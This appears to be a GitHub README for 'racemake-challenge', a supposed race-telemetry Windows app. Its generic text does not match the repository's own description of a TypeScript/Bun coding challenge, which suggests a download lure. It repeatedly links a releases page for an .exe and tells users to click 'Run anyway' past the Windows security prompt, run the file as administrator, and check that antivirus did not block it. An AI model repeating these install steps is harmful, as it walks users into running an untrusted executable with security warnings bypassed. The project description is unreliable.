# ⚙️ racemake-challenge - Run telemetry analysis with ease

[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Click%20to%20open%20releases-blue?style=for-the-badge)](https://github.com/Lazloinorganic902/racemake-challenge/releases)

## 🖥️ What this app does

racemake-challenge is a Windows app for race telemetry review and live data checks. It helps you open race data, inspect telemetry, and work with a clear API-driven workflow.

Use it to:

- View telemetry data from racing sessions
- Inspect live updates from a local or remote source
- Work with race data in a structured format
- Review data for sim racing and motorsport projects
- Run a small local service for data access

## 📥 Download and install

1. Open the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases)
2. Find the latest release for Windows
3. Download the file that matches your PC
4. If the file is zipped, extract it to a folder
5. Double-click the app file to run it

If Windows shows a security prompt:

1. Click **More info**
2. Click **Run anyway**

If you use a work PC, you may need permission from your system admin to run new apps.

## 🪟 Windows system setup

For the best result, use:

- Windows 10 or Windows 11
- A recent Intel or AMD processor
- At least 4 GB RAM
- 200 MB free disk space
- Internet access for the first download

For smoother use with larger telemetry files:

- 8 GB RAM or more
- A modern SSD
- A screen with 1366 × 768 resolution or higher

## 🚀 First run

After you start the app:

1. Wait for the main window to open
2. Load your telemetry file or session data
3. Open the dashboard or data view
4. Use the search and filter tools to find laps, events, or signals
5. Save any output you want to keep

If the app opens a local API page, keep the app running while you use it. Closing the app will stop the local service.

## 🧭 How to use it

### 1. Load race data

Open a supported telemetry file, session export, or live feed source. The app reads the data and shows it in a format you can inspect.

### 2. Review telemetry

Check speed, position, lap timing, and event markers. Use charts and lists to compare runs and spot changes.

### 3. Watch live updates

If you connect to a live source, the app can stream updates while the session runs. This helps with real-time race review and sim-racing checks.

### 4. Use the API view

The app includes a Hono-based local API. If you need to inspect endpoints, open the API page and review the available routes.

### 5. Export or reuse data

You can use the structured output in other tools that support telemetry, OpenAPI, or protobuf-style data flows.

## 🔌 Supported workflow

This project fits a few common race-data tasks:

- Telemetry analysis
- Real-time data review
- Reverse-engineering data formats
- Sim-racing session checks
- Structured API access
- Data pipeline testing

## 🧩 Features

- Clean Windows-friendly start flow
- Telemetry review tools
- Real-time data handling
- Local API service
- OpenAPI-friendly endpoint design
- Scalar-style API browsing
- TypeScript-based runtime logic
- Bun-powered execution path
- Wire format codec support
- Data pipeline structure for race data

## 📁 Project contents

The app includes:

- A telemetry processing layer
- A web API built with Hono
- A production-style codec for data encoding and decoding
- A TypeScript codebase
- Support files for local development and testing
- API docs structure for browser use

## 🔍 Typical use cases

You may use racemake-challenge when you want to:

- Inspect race telemetry after a session
- Compare lap data across runs
- Build or test a data pipeline
- Review API output from a race tool
- Explore a binary wire format
- Work with sim-racing data in a structured way

## 🛠️ If the app does not open

If double-clicking the app does not start it:

1. Check that the download finished fully
2. Confirm the file is unzipped, if needed
3. Right-click the app and choose **Run as administrator**
4. Make sure your antivirus did not block the file
5. Download the latest release again from the releases page

If the window opens and closes right away, start it from the folder where you saved it and watch for any message on screen.

## 🌐 API and data access

The app is built around a local service that exposes telemetry data in a web-friendly way. You can use it to:

- View current session data
- Check structured responses
- Test OpenAPI routes
- Browse endpoints in Scalar
- Connect other tools to the local server

## 📦 File types you may see

The release may include one or more of these:

- `.exe` for the main Windows app
- `.zip` if the app is packaged in an archive
- `.json` for config or output data
- `.proto` or similar files for wire format work
- README or docs files for quick reference

## 🧪 Good first checks

After setup, try this:

1. Open the app
2. Load a sample telemetry file
3. Confirm the chart or table appears
4. Open the API page if one is shown
5. Move through a few views to confirm the app is working

## 🧰 Useful terms

- **Telemetry**: data from a race session
- **API**: a way for software to share data
- **OpenAPI**: a standard for API docs
- **Scalar**: a tool for viewing API endpoints
- **Codec**: code that encodes and decodes data
- **Real-time**: data that updates as it happens
- **SSE**: server-sent events, used for live updates

## 📎 Download again

If you need the app file again, visit the [releases page](https://github.com/Lazloinorganic902/racemake-challenge/releases) and download the latest Windows release

## 🧾 Repository details

**Repository:** racemake-challenge  
**Description:** RACEMAKE Product Engineer Challenge — Telemetry analysis pipeline, Hono API, and production-grade wire format codec. TypeScript, Bun, Hono, Scalar.  
**Topics:** ai, bun, data-pipeline, hono, motorsport, openapi, pitgpt, protobuf, racing, real-time, reverse-engineering, scalar, sim-racing, sse, telemetry, typescript